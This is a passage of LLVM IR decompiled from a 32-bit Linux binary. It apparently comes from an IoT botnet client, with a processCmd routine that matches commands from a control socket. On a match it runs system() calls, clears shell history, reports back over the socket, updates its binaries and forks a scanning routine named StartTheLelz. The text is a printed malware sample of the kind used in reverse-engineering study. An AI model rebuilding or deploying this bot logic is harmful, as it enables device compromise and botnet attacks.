  store i32 %v0_804de8e, i32* %stack_var_-4, align 4
  %v1_804de94 = call i32 @__libc_fork(i32 %v0_804de8e)
  %v4_804de9c = icmp eq i32 %v1_804de94, 0
  %v1_804dea0 = icmp eq i1 %v4_804de9c, false
  br i1 %v1_804dea0, label %dec_label_pc_804debc, label %dec_label_pc_804dea2

dec_label_pc_804dea2:                             ; preds = %entry
  %v2_804dea9 = call i32 @__libc_system(i32 ptrtoint ([410 x i8]* @global_var_805f81c.627 to i32))
  %v2_804deb5 = call i32 @sleep(i32 20)
  br label %dec_label_pc_804decf

dec_label_pc_804debc:                             ; preds = %entry
  %v4_804deca = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805f9b6.628, i32 0, i32 0), i32 %v1_804de94)
  br label %dec_label_pc_804decf

dec_label_pc_804decf:                             ; preds = %dec_label_pc_804dea2, %dec_label_pc_804debc
  %storemerge = phi i32 [ %v4_804deca, %dec_label_pc_804debc ], [ %v2_804deb5, %dec_label_pc_804dea2 ]
  %v2_804decf = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804decf, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %dec_label_pc_804decf, { 1, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  %tmp189 = ptrtoint i32* %arg2 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_804ded4 = load i32, i32* @edi, align 4
  %v0_804ded5 = load i32, i32* @esi, align 4
  %v0_804ded6 = load i32, i32* @ebx, align 4
  store i32 %v0_804ded6, i32* %stack_var_-16, align 4
  %v5_804ded7 = icmp ult i32* %stack_var_-16, inttoptr (i32 476 to i32*)
  store i1 %v5_804ded7, i1* %cf.global-to-local, align 1
  %v2_804dee0 = load i32, i32* %arg2, align 4
  %v4_804defd = inttoptr i32 %v2_804dee0 to i8*
  %v7_804df0f = call i32 @_strncmp(i8* %v4_804defd, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805f9ba.629, i32 0, i32 0), i32 7)
  %v8_804df0f = urem i32 %v7_804df0f, 2
  %v9_804df0f = icmp eq i32 %v8_804df0f, 0
  %v0_804df11 = load i1, i1* %cf.global-to-local, align 1
  %v2_804df11 = or i1 %v0_804df11, %v9_804df0f
  %v3_804df11 = zext i1 %v2_804df11 to i32
  %v4_804df11 = load i32, i32* @edx, align 4
  %v5_804df11 = and i32 %v4_804df11, -256
  %v6_804df11 = or i32 %v3_804df11, %v5_804df11
  %v7_804df11 = xor i32 %v6_804df11, 1
  store i32 %v7_804df11, i32* @edx, align 4
  %v1_804df19 = trunc i32 %v7_804df11 to i8
  %v3_804df19 = zext i1 %v0_804df11 to i8
  %v15_804df19 = icmp eq i8 %v1_804df19, %v3_804df19
  store i1 false, i1* @cf, align 1
  %v1_804df22 = icmp eq i1 %v15_804df19, false
  br i1 %v1_804df22, label %dec_label_pc_804e0e8, label %dec_label_pc_804df28

dec_label_pc_804df28:                             ; preds = %entry
  %v1_804df2b = add i32 %tmp189, 4
  %v5_804df2b = icmp ugt i32* %arg2, inttoptr (i32 -5 to i32*)
  store i1 %v5_804df2b, i1* %cf.global-to-local, align 1
  %v1_804df2e = inttoptr i32 %v1_804df2b to i32*
  %v2_804df2e = load i32, i32* %v1_804df2e, align 4
  store i1 false, i1* @df, align 1
  %v4_804df4b = inttoptr i32 %v2_804df2e to i8*
  store i32 %v2_804df2e, i32* @esi, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_805f9c1.630 to i32), i32* @edi, align 4
  %v7_804df5d = call i32 @_strncmp(i8* %v4_804df4b, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805f9c1.630, i32 0, i32 0), i32 8)
  %v8_804df5d = urem i32 %v7_804df5d, 2
  %v9_804df5d = icmp eq i32 %v8_804df5d, 0
  %v0_804df5f = load i1, i1* %cf.global-to-local, align 1
  %v2_804df5f = or i1 %v0_804df5f, %v9_804df5d
  %v3_804df5f = zext i1 %v2_804df5f to i32
  %v4_804df5f = load i32, i32* @edx, align 4
  %v5_804df5f = and i32 %v4_804df5f, -256
  %v6_804df5f = or i32 %v3_804df5f, %v5_804df5f
  %v7_804df5f = xor i32 %v6_804df5f, 1
  store i32 %v7_804df5f, i32* @edx, align 4
  %v1_804df67 = trunc i32 %v7_804df5f to i8
  %v3_804df67 = zext i1 %v0_804df5f to i8
  %v15_804df67 = icmp eq i8 %v1_804df67, %v3_804df67
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804df70 = icmp eq i1 %v15_804df67, false
  br i1 %v1_804df70, label %dec_label_pc_804df98, label %dec_label_pc_804df72

dec_label_pc_804df72:                             ; preds = %dec_label_pc_804df28
  %v1_804df79 = call i32 @__libc_system(i32 ptrtoint ([141 x i8]* @global_var_805f9cc.631 to i32))
  %v0_804df7e = call i32 @ClearHistory()
  %v0_804df83 = load i32, i32* @global_var_8062580.20, align 128
  %v2_804df93 = call i32 @sockprintf(i32 %v0_804df83, i32 ptrtoint ([26 x i8]* @global_var_805fa59.632 to i32))
  br label %dec_label_pc_804df98

dec_label_pc_804df98:                             ; preds = %dec_label_pc_804df28, %dec_label_pc_804df72
  store i1 %v5_804df2b, i1* %cf.global-to-local, align 1
  %v2_804df9e = load i32, i32* %v1_804df2e, align 4
  store i1 false, i1* @df, align 1
  %v4_804dfbb = inttoptr i32 %v2_804df9e to i8*
  store i32 %v2_804df9e, i32* @esi, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805fa73.633 to i32), i32* @edi, align 4
  %v7_804dfcd = call i32 @_strncmp(i8* %v4_804dfbb, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805fa73.633, i32 0, i32 0), i32 7)
  %v8_804dfcd = urem i32 %v7_804dfcd, 2
  %v9_804dfcd = icmp eq i32 %v8_804dfcd, 0
  %v0_804dfcf = load i1, i1* %cf.global-to-local, align 1
  %v2_804dfcf = or i1 %v0_804dfcf, %v9_804dfcd
  %v3_804dfcf = zext i1 %v2_804dfcf to i32
  %v4_804dfcf = load i32, i32* @edx, align 4
  %v5_804dfcf = and i32 %v4_804dfcf, -256
  %v6_804dfcf = or i32 %v3_804dfcf, %v5_804dfcf
  %v7_804dfcf = xor i32 %v6_804dfcf, 1
  store i32 %v7_804dfcf, i32* @edx, align 4
  %v1_804dfd7 = trunc i32 %v7_804dfcf to i8
  %v3_804dfd7 = zext i1 %v0_804dfcf to i8
  %v15_804dfd7 = icmp eq i8 %v1_804dfd7, %v3_804dfd7
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804dfe0 = icmp eq i1 %v15_804dfd7, false
  br i1 %v1_804dfe0, label %dec_label_pc_804e008, label %dec_label_pc_804dfe2

dec_label_pc_804dfe2:                             ; preds = %dec_label_pc_804df98
  %v1_804dfe9 = call i32 @__libc_system(i32 ptrtoint ([58 x i8]* @global_var_805fa7c.634 to i32))
  %v0_804dfee = call i32 @ClearHistory()
  %v0_804dff3 = load i32, i32* @global_var_8062580.20, align 128
  %v2_804e003 = call i32 @sockprintf(i32 %v0_804dff3, i32 ptrtoint ([24 x i8]* @global_var_805fab6.635 to i32))
  br label %dec_label_pc_804e008

dec_label_pc_804e008:                             ; preds = %dec_label_pc_804df98, %dec_label_pc_804dfe2
  store i1 %v5_804df2b, i1* %cf.global-to-local, align 1
  %v2_804e00e = load i32, i32* %v1_804df2e, align 4
  store i1 false, i1* @df, align 1
  %v4_804e02b = inttoptr i32 %v2_804e00e to i8*
  store i32 %v2_804e00e, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805face.636 to i32), i32* @edi, align 4
  %v7_804e03d = call i32 @_strncmp(i8* %v4_804e02b, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805face.636, i32 0, i32 0), i32 4)
  %v8_804e03d = urem i32 %v7_804e03d, 2
  %v9_804e03d = icmp eq i32 %v8_804e03d, 0
  %v0_804e03f = load i1, i1* %cf.global-to-local, align 1
  %v2_804e03f = or i1 %v0_804e03f, %v9_804e03d
  %v3_804e03f = zext i1 %v2_804e03f to i32
  %v4_804e03f = load i32, i32* @edx, align 4
  %v5_804e03f = and i32 %v4_804e03f, -256
  %v6_804e03f = or i32 %v3_804e03f, %v5_804e03f
  %v7_804e03f = xor i32 %v6_804e03f, 1
  store i32 %v7_804e03f, i32* @edx, align 4
  %v1_804e047 = trunc i32 %v7_804e03f to i8
  %v3_804e047 = zext i1 %v0_804e03f to i8
  %v15_804e047 = icmp eq i8 %v1_804e047, %v3_804e047
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e050 = icmp eq i1 %v15_804e047, false
  br i1 %v1_804e050, label %dec_label_pc_804e078, label %dec_label_pc_804e052

dec_label_pc_804e052:                             ; preds = %dec_label_pc_804e008
  %v1_804e059 = call i32 @__libc_system(i32 ptrtoint ([31 x i8]* @global_var_805fad4.637 to i32))
  %v0_804e05e = call i32 @ClearHistory()
  %v0_804e063 = load i32, i32* @global_var_8062580.20, align 128
  %v2_804e073 = call i32 @sockprintf(i32 %v0_804e063, i32 ptrtoint ([24 x i8]* @global_var_805faf3.638 to i32))
  br label %dec_label_pc_804e078

dec_label_pc_804e078:                             ; preds = %dec_label_pc_804e008, %dec_label_pc_804e052
  store i1 %v5_804df2b, i1* %cf.global-to-local, align 1
  %v2_804e07e = load i32, i32* %v1_804df2e, align 4
  store i1 false, i1* @df, align 1
  %v4_804e09b = inttoptr i32 %v2_804e07e to i8*
  store i32 %v2_804e07e, i32* @esi, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_805fb0b.639 to i32), i32* @edi, align 4
  %v7_804e0ad = call i32 @_strncmp(i8* %v4_804e09b, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805fb0b.639, i32 0, i32 0), i32 6)
  %v8_804e0ad = urem i32 %v7_804e0ad, 2
  %v9_804e0ad = icmp eq i32 %v8_804e0ad, 0
  %v0_804e0af = load i1, i1* %cf.global-to-local, align 1
  %v2_804e0af = or i1 %v0_804e0af, %v9_804e0ad
  %v3_804e0af = zext i1 %v2_804e0af to i32
  %v4_804e0af = load i32, i32* @edx, align 4
  %v5_804e0af = and i32 %v4_804e0af, -256
  %v6_804e0af = or i32 %v3_804e0af, %v5_804e0af
  %v7_804e0af = xor i32 %v6_804e0af, 1
  store i32 %v7_804e0af, i32* @edx, align 4
  %v1_804e0b7 = trunc i32 %v7_804e0af to i8
  %v3_804e0b7 = zext i1 %v0_804e0af to i8
  %v15_804e0b7 = icmp eq i8 %v1_804e0b7, %v3_804e0b7
  store i1 false, i1* @cf, align 1
  %v1_804e0c0 = icmp eq i1 %v15_804e0b7, false
  br i1 %v1_804e0c0, label %dec_label_pc_804e0e8, label %dec_label_pc_804e0c2

dec_label_pc_804e0c2:                             ; preds = %dec_label_pc_804e078
  %v1_804e0c9 = call i32 @__libc_system(i32 ptrtoint ([40 x i8]* @global_var_805fb14.640 to i32))
  %v0_804e0ce = call i32 @ClearHistory()
  %v0_804e0d3 = load i32, i32* @global_var_8062580.20, align 128
  %v2_804e0e3 = call i32 @sockprintf(i32 %v0_804e0d3, i32 ptrtoint ([28 x i8]* @global_var_805fb3c.641 to i32))
  br label %dec_label_pc_804e0e8

dec_label_pc_804e0e8:                             ; preds = %dec_label_pc_804e078, %entry, %dec_label_pc_804e0c2
  %v2_804e0eb = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804e108 = inttoptr i32 %v2_804e0eb to i8*
  store i32 %v2_804e0eb, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8057957.21 to i32), i32* @edi, align 4
  %v7_804e11a = call i32 @_strncmp(i8* %v4_804e108, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8057957.21, i32 0, i32 0), i32 5)
  %v8_804e11a = urem i32 %v7_804e11a, 2
  %v9_804e11a = icmp eq i32 %v8_804e11a, 0
  %v0_804e11c = load i1, i1* @cf, align 1
  %v2_804e11c = or i1 %v0_804e11c, %v9_804e11a
  %v3_804e11c = zext i1 %v2_804e11c to i32
  %v4_804e11c = load i32, i32* @edx, align 4
  %v5_804e11c = and i32 %v4_804e11c, -256
  %v6_804e11c = or i32 %v3_804e11c, %v5_804e11c
  %v7_804e11c = xor i32 %v6_804e11c, 1
  store i32 %v7_804e11c, i32* %edx.global-to-local, align 4
  %v1_804e124 = trunc i32 %v7_804e11c to i8
  %v3_804e124 = zext i1 %v0_804e11c to i8
  %v15_804e124 = icmp eq i8 %v1_804e124, %v3_804e124
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e12d = icmp eq i1 %v15_804e124, false
  br i1 %v1_804e12d, label %dec_label_pc_804e149, label %dec_label_pc_804e12f

dec_label_pc_804e12f:                             ; preds = %dec_label_pc_804e0e8
  %v0_804e12f = load i32, i32* @global_var_8062580.20, align 128
  %v2_804e13f = call i32 @sockprintf(i32 %v0_804e12f, i32 ptrtoint ([6 x i8]* @global_var_805fb58.642 to i32))
  br label %dec_label_pc_804f27a

dec_label_pc_804e149:                             ; preds = %dec_label_pc_804e0e8
  %v2_804e14c = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804e169 = inttoptr i32 %v2_804e14c to i8*
  store i32 %v2_804e14c, i32* @esi, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_805fb5e.643 to i32), i32* @edi, align 4
  %v7_804e17b = call i32 @_strncmp(i8* %v4_804e169, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805fb5e.643, i32 0, i32 0), i32 6)
  %v8_804e17b = urem i32 %v7_804e17b, 2
  %v9_804e17b = icmp eq i32 %v8_804e17b, 0
  %v0_804e17d = load i1, i1* %cf.global-to-local, align 1
  %v2_804e17d = or i1 %v0_804e17d, %v9_804e17b
  %v3_804e17d = zext i1 %v2_804e17d to i32
  %v4_804e17d = load i32, i32* %edx.global-to-local, align 4
  %v5_804e17d = and i32 %v4_804e17d, -256
  %v6_804e17d = or i32 %v3_804e17d, %v5_804e17d
  %v7_804e17d = xor i32 %v6_804e17d, 1
  store i32 %v7_804e17d, i32* %edx.global-to-local, align 4
  %v1_804e185 = trunc i32 %v7_804e17d to i8
  %v3_804e185 = zext i1 %v0_804e17d to i8
  %v15_804e185 = icmp eq i8 %v1_804e185, %v3_804e185
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e18e = icmp eq i1 %v15_804e185, false
  br i1 %v1_804e18e, label %dec_label_pc_804e1b4, label %dec_label_pc_804e190

dec_label_pc_804e190:                             ; preds = %dec_label_pc_804e149
  %v0_804e190 = call i32 @getdtablesize()
  %v0_804e195 = load i32, i32* @global_var_8062580.20, align 128
  store i32 %v0_804e195, i32* %edx.global-to-local, align 4
  %v2_804e1aa = call i32 @sockprintf(i32 %v0_804e195, i32 ptrtoint ([3 x i8]* @global_var_805fb64.644 to i32))
  br label %dec_label_pc_804f27a

dec_label_pc_804e1b4:                             ; preds = %dec_label_pc_804e149
  %v2_804e1b7 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804e1d4 = inttoptr i32 %v2_804e1b7 to i8*
  store i32 %v2_804e1b7, i32* @esi, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805fa73.633 to i32), i32* @edi, align 4
  %v7_804e1e6 = call i32 @_strncmp(i8* %v4_804e1d4, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_805fa73.633, i32 0, i32 0), i32 7)
  %v8_804e1e6 = urem i32 %v7_804e1e6, 2
  %v9_804e1e6 = icmp eq i32 %v8_804e1e6, 0
  %v0_804e1e8 = load i1, i1* %cf.global-to-local, align 1
  %v2_804e1e8 = or i1 %v0_804e1e8, %v9_804e1e6
  %v3_804e1e8 = zext i1 %v2_804e1e8 to i32
  %v4_804e1e8 = load i32, i32* %edx.global-to-local, align 4
  %v5_804e1e8 = and i32 %v4_804e1e8, -256
  %v6_804e1e8 = or i32 %v3_804e1e8, %v5_804e1e8
  %v7_804e1e8 = xor i32 %v6_804e1e8, 1
  store i32 %v7_804e1e8, i32* %edx.global-to-local, align 4
  %v1_804e1f0 = trunc i32 %v7_804e1e8 to i8
  %v3_804e1f0 = zext i1 %v0_804e1e8 to i8
  %v15_804e1f0 = icmp eq i8 %v1_804e1f0, %v3_804e1f0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e1f9 = icmp eq i1 %v15_804e1f0, false
  br i1 %v1_804e1f9, label %dec_label_pc_804e221, label %dec_label_pc_804e1fb

dec_label_pc_804e1fb:                             ; preds = %dec_label_pc_804e1b4
  %v0_804e1fb = load i32, i32* @global_var_8062580.20, align 128
  %v2_804e20b = call i32 @sockprintf(i32 %v0_804e1fb, i32 ptrtoint ([25 x i8]* @global_var_805fb67.645 to i32))
  %v1_804e217 = call i32 @UpdateBins(i32 1)
  br label %dec_label_pc_804f27a

dec_label_pc_804e221:                             ; preds = %dec_label_pc_804e1b4
  %v2_804e224 = load i32, i32* %arg2, align 4
  %v4_804e241 = inttoptr i32 %v2_804e224 to i8*
  %v7_804e253 = call i32 @_strncmp(i8* %v4_804e241, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805fb80.646, i32 0, i32 0), i32 8)
  %v8_804e253 = urem i32 %v7_804e253, 2
  %v9_804e253 = icmp eq i32 %v8_804e253, 0
  %v0_804e255 = load i1, i1* %cf.global-to-local, align 1
  %v2_804e255 = or i1 %v0_804e255, %v9_804e253
  %v3_804e255 = zext i1 %v2_804e255 to i32
  %v4_804e255 = load i32, i32* %edx.global-to-local, align 4
  %v5_804e255 = and i32 %v4_804e255, -256
  %v6_804e255 = or i32 %v3_804e255, %v5_804e255
  %v7_804e255 = xor i32 %v6_804e255, 1
  store i32 %v7_804e255, i32* %edx.global-to-local, align 4
  %v1_804e25d = trunc i32 %v7_804e255 to i8
  %v3_804e25d = zext i1 %v0_804e255 to i8
  %v15_804e25d = icmp eq i8 %v1_804e25d, %v3_804e25d
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e266 = icmp eq i1 %v15_804e25d, false
  br i1 %v1_804e266, label %dec_label_pc_804e3e2, label %dec_label_pc_804e26c

dec_label_pc_804e26c:                             ; preds = %dec_label_pc_804e221
  %v1_804e26f = add i32 %tmp189, 4
  %v5_804e26f = icmp ugt i32* %arg2, inttoptr (i32 -5 to i32*)
  store i1 %v5_804e26f, i1* %cf.global-to-local, align 1
  %v1_804e272 = inttoptr i32 %v1_804e26f to i32*
  %v2_804e272 = load i32, i32* %v1_804e272, align 4
  store i1 false, i1* @df, align 1
  %v4_804e28f = inttoptr i32 %v2_804e272 to i8*
  store i32 %v2_804e272, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805face.636 to i32), i32* @edi, align 4
  %v7_804e2a1 = call i32 @_strncmp(i8* %v4_804e28f, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805face.636, i32 0, i32 0), i32 4)
  %v8_804e2a1 = urem i32 %v7_804e2a1, 2
  %v9_804e2a1 = icmp eq i32 %v8_804e2a1, 0
  %v0_804e2a3 = load i1, i1* %cf.global-to-local, align 1
  %v2_804e2a3 = or i1 %v0_804e2a3, %v9_804e2a1
  %v3_804e2a3 = zext i1 %v2_804e2a3 to i32
  %v4_804e2a3 = load i32, i32* %edx.global-to-local, align 4
  %v5_804e2a3 = and i32 %v4_804e2a3, -256
  %v6_804e2a3 = or i32 %v3_804e2a3, %v5_804e2a3
  %v7_804e2a3 = xor i32 %v6_804e2a3, 1
  store i32 %v7_804e2a3, i32* @edx, align 4
  %v1_804e2ab = trunc i32 %v7_804e2a3 to i8
  %v3_804e2ab = zext i1 %v0_804e2a3 to i8
  %v15_804e2ab = icmp eq i8 %v1_804e2ab, %v3_804e2ab
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e2b4 = icmp eq i1 %v15_804e2ab, false
  br i1 %v1_804e2b4, label %dec_label_pc_804e2f7, label %dec_label_pc_804e2b6

dec_label_pc_804e2b6:                             ; preds = %dec_label_pc_804e26c
  %v0_804e2b6 = load i32, i32* @global_var_8068810.647, align 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e2bb = icmp eq i32 %v0_804e2b6, 0
  br i1 %v1_804e2bb, label %dec_label_pc_804f27a, label %dec_label_pc_804e2c3

dec_label_pc_804e2c3:                             ; preds = %dec_label_pc_804e2b6
  %v2_804e2d3 = call i32 @kill(i32 %v0_804e2b6, i32 9)
  %v0_804e2d8 = load i32, i32* @global_var_8062580.20, align 128
  %v2_804e2e8 = call i32 @sockprintf(i32 %v0_804e2d8, i32 ptrtoint ([17 x i8]* @global_var_805fb88.648 to i32))
  store i32 0, i32* @global_var_8068810.647, align 16
  br label %dec_label_pc_804e2f7

dec_label_pc_804e2f7:                             ; preds = %dec_label_pc_804e26c, %dec_label_pc_804e2c3
  store i1 %v5_804e26f, i1* %cf.global-to-local, align 1
  %v2_804e2fd = load i32, i32* %v1_804e272, align 4
  store i1 false, i1* @df, align 1
  %v4_804e31a = inttoptr i32 %v2_804e2fd to i8*
  store i32 %v2_804e2fd, i32* @esi, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_805fb99.649 to i32), i32* @edi, align 4
  %v7_804e32c = call i32 @_strncmp(i8* %v4_804e31a, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805fb99.649, i32 0, i32 0), i32 3)
  %v8_804e32c = urem i32 %v7_804e32c, 2
  %v9_804e32c = icmp eq i32 %v8_804e32c, 0
  %v0_804e32e = load i1, i1* %cf.global-to-local, align 1
  %v2_804e32e = or i1 %v0_804e32e, %v9_804e32c
  %v3_804e32e = zext i1 %v2_804e32e to i32
  %v4_804e32e = load i32, i32* @edx, align 4
  %v5_804e32e = and i32 %v4_804e32e, -256
  %v6_804e32e = or i32 %v3_804e32e, %v5_804e32e
  %v7_804e32e = xor i32 %v6_804e32e, 1
  store i32 %v7_804e32e, i32* %edx.global-to-local, align 4
  %v1_804e336 = trunc i32 %v7_804e32e to i8
  %v3_804e336 = zext i1 %v0_804e32e to i8
  %v15_804e336 = icmp eq i8 %v1_804e336, %v3_804e336
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e33f = icmp eq i1 %v15_804e336, false
  br i1 %v1_804e33f, label %dec_label_pc_804e3e2, label %dec_label_pc_804e345

dec_label_pc_804e345:                             ; preds = %dec_label_pc_804e2f7
  %v0_804e345 = load i32, i32* @global_var_8068810.647, align 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e34a = icmp eq i32 %v0_804e345, 0
  %v1_804e34c = icmp eq i1 %v1_804e34a, false
  br i1 %v1_804e34c, label %dec_label_pc_804f27a, label %dec_label_pc_804e352

dec_label_pc_804e352:                             ; preds = %dec_label_pc_804e345
  %v1_804e352 = call i32 @__libc_fork(i32 3)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804e371 = icmp eq i32 %v1_804e352, 0
  br i1 %v4_804e371, label %dec_label_pc_804e397, label %dec_label_pc_804e37a

dec_label_pc_804e37a:                             ; preds = %dec_label_pc_804e352
  store i32 %v1_804e352, i32* @global_var_8068810.647, align 16
  br label %dec_label_pc_804f27a

dec_label_pc_804e397:                             ; preds = %dec_label_pc_804e352
  store i1 true, i1* %cf.global-to-local, align 1
  %v0_804e397 = load i32, i32* @global_var_8068808.157, align 8
  %v1_804e39f = call i32 @__GI_inet_ntoa(i32 %v0_804e397)
  %v0_804e3a4 = load i32, i32* @global_var_8062580.20, align 128
  store i32 %v0_804e3a4, i32* %edx.global-to-local, align 4
  %v2_804e3b9 = call i32 @sockprintf(i32 %v0_804e3a4, i32 ptrtoint ([26 x i8]* @global_var_805fb9c.650 to i32))
  %v2_804e3d1 = call i32 @StartTheLelz(i32 10, i32 1000)
  %v1_804e3dd = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804e3e2:                             ; preds = %dec_label_pc_804e2f7, %dec_label_pc_804e221
  %v2_804e3e5 = load i32, i32* %arg2, align 4
  %v4_804e402 = inttoptr i32 %v2_804e3e5 to i8*
  %v7_804e414 = call i32 @_strncmp(i8* %v4_804e402, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805fbb6.651, i32 0, i32 0), i32 6)
  %v8_804e414 = urem i32 %v7_804e414, 2
  %v9_804e414 = icmp eq i32 %v8_804e414, 0
  %v0_804e416 = load i1, i1* %cf.global-to-local, align 1
  %v2_804e416 = or i1 %v0_804e416, %v9_804e414
  %v3_804e416 = zext i1 %v2_804e416 to i32
  %v4_804e416 = load i32, i32* %edx.global-to-local, align 4
  %v5_804e416 = and i32 %v4_804e416, -256
  %v6_804e416 = or i32 %v3_804e416, %v5_804e416
  %v7_804e416 = xor i32 %v6_804e416, 1
  store i32 %v7_804e416, i32* %edx.global-to-local, align 4
  %v1_804e41e = trunc i32 %v7_804e416 to i8
  %v3_804e41e = zext i1 %v0_804e416 to i8
  %v15_804e41e = icmp eq i8 %v1_804e41e, %v3_804e41e
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e427 = icmp eq i1 %v15_804e41e, false
  br i1 %v1_804e427, label %dec_label_pc_804e58a, label %dec_label_pc_804e42d

dec_label_pc_804e42d:                             ; preds = %dec_label_pc_804e3e2
  %v1_804e430 = add i32 %tmp189, 4
  %v5_804e430 = icmp ugt i32* %arg2, inttoptr (i32 -5 to i32*)
  store i1 %v5_804e430, i1* %cf.global-to-local, align 1
  %v1_804e433 = inttoptr i32 %v1_804e430 to i32*
  %v2_804e433 = load i32, i32* %v1_804e433, align 4
  store i1 false, i1* @df, align 1
  %v4_804e450 = inttoptr i32 %v2_804e433 to i8*
  store i32 %v2_804e433, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_805face.636 to i32), i32* @edi, align 4
  %v7_804e462 = call i32 @_strncmp(i8* %v4_804e450, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_805face.636, i32 0, i32 0), i32 4)
  %v8_804e462 = urem i32 %v7_804e462, 2
  %v9_804e462 = icmp eq i32 %v8_804e462, 0
  %v0_804e464 = load i1, i1* %cf.global-to-local, align 1
  %v2_804e464 = or i1 %v0_804e464, %v9_804e462
  %v3_804e464 = zext i1 %v2_804e464 to i32
  %v4_804e464 = load i32, i32* %edx.global-to-local, align 4
  %v5_804e464 = and i32 %v4_804e464, -256
  %v6_804e464 = or i32 %v3_804e464, %v5_804e464
  %v7_804e464 = xor i32 %v6_804e464, 1
  store i32 %v7_804e464, i32* @edx, align 4
  %v1_804e46c = trunc i32 %v7_804e464 to i8
  %v3_804e46c = zext i1 %v0_804e464 to i8
  %v15_804e46c = icmp eq i8 %v1_804e46c, %v3_804e46c
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e475 = icmp eq i1 %v15_804e46c, false
  br i1 %v1_804e475, label %dec_label_pc_804e4ca, label %dec_label_pc_804e477

dec_label_pc_804e477:                             ; preds = %dec_label_pc_804e42d
  %v0_804e477 = load i32, i32* @global_var_8068810.647, align 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e47c = icmp eq i32 %v0_804e477, 0
  br i1 %v1_804e47c, label %dec_label_pc_804f27a, label %dec_label_pc_804e484

dec_label_pc_804e484:                             ; preds = %dec_label_pc_804e477
  %v2_804e494 = call i32 @kill(i32 %v0_804e477, i32 9)
  %v0_804e499 = load i32, i32* @global_var_8068808.157, align 8
  %v1_804e4a1 = call i32 @__GI_inet_ntoa(i32 %v0_804e499)
  %v0_804e4a6 = load i32, i32* @global_var_8062580.20, align 128
  store i32 %v0_804e4a6, i32* %edx.global-to-local, align 4
  %v2_804e4bb = call i32 @sockprintf(i32 %v0_804e4a6, i32 ptrtoint ([23 x i8]* @global_var_805fbbc.652 to i32))
  store i32 0, i32* @global_var_8068810.647, align 16
  br label %dec_label_pc_804e4ca

dec_label_pc_804e4ca:                             ; preds = %dec_label_pc_804e42d, %dec_label_pc_804e484
  store i1 %v5_804e430, i1* %cf.global-to-local, align 1
  %v2_804e4d0 = load i32, i32* %v1_804e433, align 4
  store i1 false, i1* @df, align 1
  %v4_804e4ed = inttoptr i32 %v2_804e4d0 to i8*
  store i32 %v2_804e4d0, i32* @esi, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_805fb99.649 to i32), i32* @edi, align 4
  %v7_804e4ff = call i32 @_strncmp(i8* %v4_804e4ed, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805fb99.649, i32 0, i32 0), i32 3)
  %v8_804e4ff = urem i32 %v7_804e4ff, 2
  %v9_804e4ff = icmp eq i32 %v8_804e4ff, 0
  %v0_804e501 = load i1, i1* %cf.global-to-local, align 1
  %v2_804e501 = or i1 %v0_804e501, %v9_804e4ff
  %v3_804e501 = zext i1 %v2_804e501 to i32
  %v4_804e501 = load i32, i32* @edx, align 4
  %v5_804e501 = and i32 %v4_804e501, -256
  %v6_804e501 = or i32 %v3_804e501, %v5_804e501
  %v7_804e501 = xor i32 %v6_804e501, 1
  store i32 %v7_804e501, i32* %edx.global-to-local, align 4
  %v1_804e509 = trunc i32 %v7_804e501 to i8
  %v3_804e509 = zext i1 %v0_804e501 to i8
  %v15_804e509 = icmp eq i8 %v1_804e509, %v3_804e509
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e512 = icmp eq i1 %v15_804e509, false
  br i1 %v1_804e512, label %dec_label_pc_804e58a, label %dec_label_pc_804e514

dec_label_pc_804e514:                             ; preds = %dec_label_pc_804e4ca
  %v0_804e514 = load i32, i32* @global_var_8068810.647, align 16
  store i1 false, i1* %cf.global-to-local, align 1
